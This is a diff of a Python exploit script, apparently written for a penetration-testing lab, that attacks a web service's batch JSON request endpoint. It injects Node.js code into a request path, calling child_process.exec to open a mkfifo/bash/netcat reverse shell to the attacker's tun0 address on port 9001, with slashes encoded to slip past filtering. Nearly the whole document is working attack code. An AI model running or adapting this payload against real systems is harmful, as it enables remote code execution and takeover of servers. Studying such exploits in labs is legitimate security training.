@@ -1,9 +1,7 @@
 import sys
-import re
 import json
 import requests
-from bs4 import BeautifulSoup
-
+import os
 # '{ "requests": [{ "method": "get", "path": "/profile" }, { "method": "get", "path": "/item" }, { "method": "get", "path": "/item/$1.id" }] }'
 
 def send_request(target):
@@ -20,17 +18,21 @@ def send_request(target):
 		"method":"get",
 		"path": "/item/$1.id;"
 	})
-	print(request1)
-	cmd = "require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.234 9001 >/tmp/f')"
+
+	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
+	LPORT = 9001
+	print("Sending reverse shell... Ensure netcat listening on port 9001")
+
+	cmd = f"require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f')"
 	cmd = cmd.replace("/", "\\\\x2f")
 	# Put 2 \\ so that it can be resolved twice by Python, once here and once in request
 
 	request = f'{{"method": "get", "path": "/item/$1.id;{cmd}"}}'
 	payload = f'{{"requests":[{request1},{request2},{request}]}}'
-	print(payload)
+	print("Payload: ", payload)
 
 	r = requests.post(target, payload)
-	print(r.text)
+	print("Response: ", r.text)
 
 def main():
     if len(sys.argv) != 2:
